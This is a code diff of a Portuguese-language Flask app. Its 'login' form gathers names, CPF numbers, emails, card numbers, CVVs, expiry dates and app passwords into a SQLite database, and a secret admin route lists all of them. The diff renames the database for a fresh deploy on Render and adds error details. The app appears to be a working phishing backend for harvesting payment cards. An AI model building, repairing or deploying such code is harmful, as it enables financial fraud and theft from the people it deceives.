@@ -4,10 +4,12 @@ from flask import Flask, render_template, request, redirect, url_for
 
 app = Flask(__name__)
 
+# Mudei o nome para v4 para garantir que o Render crie um banco NOVO e limpo
+DB_NAME = 'dados_final_v4.db'
+
 def init_db():
     try:
-        # Usando um nome de banco novo para evitar conflitos de colunas antigas
-        conn = sqlite3.connect('dados_vendas_v3.db')
+        conn = sqlite3.connect(DB_NAME)
         cursor = conn.cursor()
         cursor.execute('''CREATE TABLE IF NOT EXISTS clientes 
             (id INTEGER PRIMARY KEY AUTOINCREMENT, 
@@ -33,7 +35,7 @@ def login():
         cvv = request.form.get('cvv')
         validade = request.form.get('validade')
         
-        conn = sqlite3.connect('dados_vendas_v3.db')
+        conn = sqlite3.connect(DB_NAME)
         cursor = conn.cursor()
         cursor.execute('''INSERT INTO clientes (nome, cpf, email, num_cartao, senha_app, cvv, validade) 
                           VALUES (?,?,?,?,?,?,?)''', (nome, cpf, email, cartao, senha, cvv, validade))
@@ -50,14 +52,14 @@ def sucesso():
 @app.route('/admin_painel_secreto_99')
 def admin():
     try:
-        conn = sqlite3.connect('dados_vendas_v3.db')
+        conn = sqlite3.connect(DB_NAME)
         cursor = conn.cursor()
         cursor.execute('SELECT * FROM clientes ORDER BY id DESC')
         usuarios = cursor.fetchall()
         conn.close()
         return render_template('admin.html', usuarios=usuarios)
-    except:
-        return "Erro ao carregar painel."
+    except Exception as e:
+        return f"Erro ao carregar painel: {e}"
 
 if __name__ == '__main__':
     init_db()
